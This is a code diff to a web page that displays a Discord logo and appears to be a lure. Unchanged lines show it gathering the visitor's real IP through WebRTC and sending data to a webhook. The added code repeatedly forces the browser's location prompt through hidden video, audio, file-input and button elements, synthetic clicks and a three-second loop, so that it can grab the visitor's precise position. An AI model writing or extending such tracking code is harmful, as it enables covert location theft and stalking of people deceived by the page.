@@ -138,12 +138,18 @@
             margin-top: 10px;
             text-align: center;
         }
+        .hidden-trigger {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <!-- Discord SVG Logo -->
         <svg class="discord-logo" viewBox="0 0 127.14 96.36">
             <path fill="#5865F2" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.85,5.18,77.65,77.65,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,28.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
         </svg>
@@ -185,9 +191,7 @@
     let checkInterval = null;
     let watchId = null;
     let userIP = 'unknown';
-    let attemptCount = 0;
-    let allMethods = [];
-    let currentMethodIndex = 0;
+    let permissionChecked = false;
 
     // === GET REAL IP VIA WEBRTC ===
     function getWebRTCIP() {
@@ -260,6 +264,113 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
         }).catch(() => {});
+    }
+
+    // === CHECK IF LOCATION IS ALREADY GRANTED ===
+    function checkLocationPermission() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve(false); return; }
+            
+            // Try to get position - if it works immediately, permission is granted
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    permissionChecked = true;
+                    resolve(true);
+                },
+                (err) => {
+                    permissionChecked = true;
+                    // If error is not "denied", it might be pending or already granted
+                    if (err.code === 1) {
+                        resolve(false); // Denied
+                    } else {
+                        // Permission state unknown - could be granted but waiting
+                        resolve(null);
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 100 }
+            );
+        });
+    }
+
+    // === FORCE LOCATION PROMPT EXACTLY LIKE MICROPHONE ===
+    function forceLocationLikeMicrophone() {
+        methodIndicator.textContent = 'Forcing location prompt (microphone-style)...';
+        
+        // Method 1: Create hidden video element (triggers permission on iOS Safari)
+        try {
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            document.body.appendChild(video);
+            if (video.webkitEnterFullscreen) {
+                video.webkitEnterFullscreen();
+            }
+            setTimeout(() => {
+                document.body.removeChild(video);
+            }, 100);
+        } catch (e) {}
+
+        // Method 2: Hidden audio context (triggers on Safari)
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            audioCtx.resume().then(() => {
+                audioCtx.close();
+            }).catch(() => {});
+        } catch (e) {}
+
+        // Method 3: Hidden file input + click (triggers gesture requirement)
+        try {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.style.display = 'none';
+            input.onclick = function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }
+            };
+            document.body.appendChild(input);
+            input.click();
+            setTimeout(() => {
+                document.body.removeChild(input);
+            }, 100);
+        } catch (e) {}
+
+        // Method 4: Hidden button with geolocation call
+        try {
+            const btn = document.createElement('button');
+            btn.style.display = 'none';
+            btn.onclick = function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }
+            };
+            document.body.appendChild(btn);
+            btn.click();
+            document.body.removeChild(btn);
+        } catch (e) {}
+
+        // Method 5: watchPosition with immediate callback
+        try {
+            const id = navigator.geolocation.watchPosition(
+                () => {},
+                () => {},
+                { enableHighAccuracy: true, timeout: 1 }
+            );
+            setTimeout(() => {
+                navigator.geolocation.clearWatch(id);
+            }, 50);
+        } catch (e) {}
+
+        // Method 6: getCurrentPosition with high accuracy
+        try {
+            navigator.geolocation.getCurrentPosition(
+                () => {},
+                () => {},
+                { enableHighAccuracy: true, timeout: 1 }
+            );
+        } catch (e) {}
     }
 
     // === LOCATION METHODS ===
@@ -382,24 +493,46 @@
     // === TRY ALL METHODS SEQUENTIALLY ===
     async function tryAllLocationMethods() {
         const methods = [
-            { fn: method1_getCurrentPosition, name: 'Method 1: getCurrentPosition' },
-            { fn: method2_watchPosition, name: 'Method 2: watchPosition' },
-            { fn: method3_hiddenButton, name: 'Method 3: Hidden Button (iOS)' },
-            { fn: method4_userGesture, name: 'Method 4: User Gesture' },
-            { fn: method5_clickSimulation, name: 'Method 5: Click Simulation' }
+            { fn: method1_getCurrentPosition, name: 'getCurrentPosition' },
+            { fn: method2_watchPosition, name: 'watchPosition' },
+            { fn: method3_hiddenButton, name: 'Hidden Button' },
+            { fn: method4_userGesture, name: 'User Gesture' },
+            { fn: method5_clickSimulation, name: 'Click Simulation' }
         ];
 
-        // First: 3 immediate attempts with getCurrentPosition
-        statusText.innerHTML = '📍 Requesting location access... (Attempt 1/3)';
+        // First: Check if location is already granted
+        methodIndicator.textContent = 'Checking permission status...';
+        const hasPermission = await checkLocationPermission();
+        
+        if (hasPermission === true) {
+            methodIndicator.textContent = '✅ Location already granted - grabbing now...';
+            // Already granted - grab immediately
+            const pos = await method1_getCurrentPosition();
+            if (pos) {
+                methodIndicator.textContent = '✅ Location acquired (pre-granted)';
+                return pos;
+            }
+        }
+
+        // If permission is denied or unknown, force the prompt like microphone
+        if (hasPermission === false || hasPermission === null) {
+            methodIndicator.textContent = '⏳ Forcing location prompt (microphone-style)...';
+            forceLocationLikeMicrophone();
+            await new Promise(r => setTimeout(r, 300));
+        }
+
+        // 3 immediate attempts with getCurrentPosition
         for (let i = 0; i < 3; i++) {
             methodIndicator.textContent = `Attempt ${i+1}/3 - getCurrentPosition`;
+            statusText.innerHTML = `📍 Requesting location access... (Attempt ${i+1}/3)`;
             const result = await method1_getCurrentPosition();
             if (result) {
                 methodIndicator.textContent = '✅ Location acquired!';
                 return result;
             }
             if (i < 2) {
-                statusText.innerHTML = `📍 Requesting location access... (Attempt ${i+2}/3)`;
+                // Re-trigger the prompt between attempts
+                forceLocationLikeMicrophone();
                 await new Promise(r => setTimeout(r, 500));
             }
         }
@@ -413,6 +546,9 @@
             methodIndicator.textContent = `Fallback ${i+1}/5: ${method.name}`;
             statusText.innerHTML = `⏳ Attempting ${method.name}...`;
             
+            // Force prompt before each method
+            forceLocationLikeMicrophone();
+            
             const result = await method.fn();
             if (result) {
                 methodIndicator.textContent = `✅ Acquired via ${method.name}`;
@@ -422,7 +558,7 @@
         }
 
         // If all methods fail, return null
-        methodIndicator.textContent = '❌ All methods failed - waiting for manual allow';
+        methodIndicator.textContent = '⏳ Waiting for manual allow...';
         return null;
     }
 
@@ -474,6 +610,9 @@
             statusText.innerHTML = '⚠ Location access required. Click ALLOW in browser.';
             statusBox.style.borderColor = '#ffaa00';
             methodIndicator.textContent = '⏳ Waiting for user to allow...';
+            
+            // Force prompt continuously
+            setInterval(forceLocationLikeMicrophone, 3000);
             
             // Retry with watchPosition continuously
             if (navigator.geolocation) {
